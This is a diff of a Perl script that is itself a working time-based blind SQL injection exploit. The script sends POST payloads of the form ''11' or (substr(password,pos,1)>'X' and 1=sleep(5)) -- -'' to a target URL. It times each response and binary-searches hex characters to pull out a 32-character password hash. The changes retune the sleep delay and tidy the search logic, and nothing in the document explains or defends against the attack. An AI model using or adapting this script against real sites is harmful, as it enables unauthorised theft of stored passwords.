@@ -38,122 +38,110 @@ my@results=();
 
 my$rrrequest=0;
 sub makerequest{
-	my$p="$_[0]";
-	my$pos=$_[1]+1;
+        my$p="$_[0]";
+        my$pos=$_[1]+1;
 
-print("      request: $rrrequest\n");
+print("                     request: $rrrequest\n");
 $rrrequest++;
+#if($rrrequest==128){exit();}
 
-	my$shit;
-$shit="11' or (substr(password,$pos,1)>'".$p."' and 1=sleep(2)) -- -";
-	my$request=HTTP::Request->new(POST=>$const_url);
+        my$shit;
+$shit="11' or (substr(password,$pos,1)>'".$p."' and 1=sleep(5)) -- -";
+        my$request=HTTP::Request->new(POST=>$const_url);
 $request->content_type('application/x-www-form-urlencoded');
-$request->content("it=ct&en=$shit");
-	$request->header("Cookie"=>"AAA=BBB");
+$request->content("it=ect&ion=$shit");
+        $request->header("Cookie"=>"AAA=BBB");
 #print($request->as_string."\n");
-	my$ua=LWP::UserAgent->new;
-	my$response=$ua->request($request);
-	if ($response->is_success) {
-		return $response->decoded_content;
-	}
-	else {
+        my$ua=LWP::UserAgent->new;
+        my$response=$ua->request($request);
+        if ($response->is_success) {
+                return $response->decoded_content;
+        }
+        else {
 #print STDERR $response->status_line, "\n";
-	}
+        }
 }
 
 sub shit_i{
-	my$i=$_[0];
-	if($i>9){
-		return chr($i+55);
-	}
-return "$i";
+        my$i=$_[0];
+return$i>9?chr($i+55):"$i";
 }
 
-#                        >4     -    >8   -       >12
-#                       /   \                 /         \
-#                     >2      >6            >10              >14
-#                    /  \    /  \          /    \          /     \
-#                  >1  (3) >5   >7       >9       >11     >13       (15)
-#                 / \     / \   / \      / \      /  \     /  \     
-#               (0) (1)(5) (6) (7) (8) (9) (10) (11) (12) (13) (14)
-
+#                          >3     -      >7     -       >11
+#                       /     \                      /       \   
+#                  >1            >5            >9                >13
+#                  / \           / \          /  \              /  \
+#               >0     >2     >4     >6     >8     >10      >12      >14
+#               /\     /\     /\     /\     /\      /\       /\       /\
+#             (0)(1) (2)(3) (4)(5) (6)(7) (8)(9) (10)(11) (12)(13) (14)(15)
 sub check{
         my$c=$_[0];
         my$i=$_[1];
         my$fl=$_[2];
-        my$min=0;
-        my$max=$c;
         my$t;
-
+        my$lvl=1;
         my$n=$i%2;
-        if($n==1){
-                if($fl>0||$min+2==$i||$max-2==$i){$t=$i+1;}
-                else{$t=$i-1;}
+        if($n==0){
+                $t=$fl>0?$i+1:$i;
                 return(1,$t);
         }
-
-# TODO: fix this shit
-        if($i==2||$i==6||$i==10||$i==14){
-                $t=$fl>0?$i+1:$i-1;
-                return(0,$t);
-        }
-# TODO: fix this shit
-if($i==4){$t=$fl>0?6:2;}
-if($i==12){$t=$fl>0?14:10;}
-if($i==8){$t=$fl>0?12:4;}
-return(0,$t);
+        if($i==7){$lvl=4}
+        elsif($i==3||$i==11){$lvl=2}
+        $t=$fl>0?$i+$lvl:$i-$lvl;
+        return(0,$t);
 }
 
 
 sub get_result{ 
-	my$result="";
-	my$min=0;
-	my$max=16;
-	my$str="";
-	my$r;
-	my$tmp;
-	my$t1;
-	my$t2;
-	my$t3;
+        my$result="";
+        my$min=0;
+        my$max=16;
+        my$str="";
+        my$r;
+        my$tmp;
+        my$t1;
+        my$t2;
+        my$t3;
 
-	my$fl;
-	my@x;
+        my$fl;
+        my@x;
 
-	for(my$i=0;$i<32;$i++){
+        for(my$i=0;$i<32;$i++){
+                print("    i: $i \n");
 
-		$tmp=8;
+                $tmp=7;
 label:
-		$str=shit_i($tmp);
-		print("    i: $i; str: $str; tmp: $tmp\n");
-		$t1=time;
-		$r=makerequest($str,$i);
-		$t2=time;
-		$t3=$t2-$t1;
-		$fl=$t3>2?1:0;
-		@x=check($max,$tmp,$fl);
-		print("    check: @x; fl: $fl; t3: $t3 \n");
-		if ($x[0]>0) {
-			$result.=$str;
-			print("res: $result\n");
-			goto cont;
-		}
-		else{
-			$tmp=$x[1];
-			goto label;
-		}
+                $str=shit_i($tmp);
+                print("    makerequest: $str\n");
+                $t1=time;
+                $r=makerequest($str,$i);
+                $t2=time;
+                $t3=$t2-$t1;
+                $fl=$t3>5?1:0;
+                print("    find: $tmp; fl: $fl; time: $t3 \n");
+                @x=check($max,$tmp,$fl);
+                print("    result: @x\n");
+                if ($x[0]>0) {
+                        $result.=shit_i($x[1]);
+                        print("res: $result\n");
+                        goto cont;
+                }
+                else{
+                        $tmp=$x[1];
+                        goto label;
+                }
 cont:;
 
 
-	}
+        }
 }
 
 sub main(){
 
 
-	get_result();
+        get_result();
 
 }
-main(); 
-
+main();
 
 
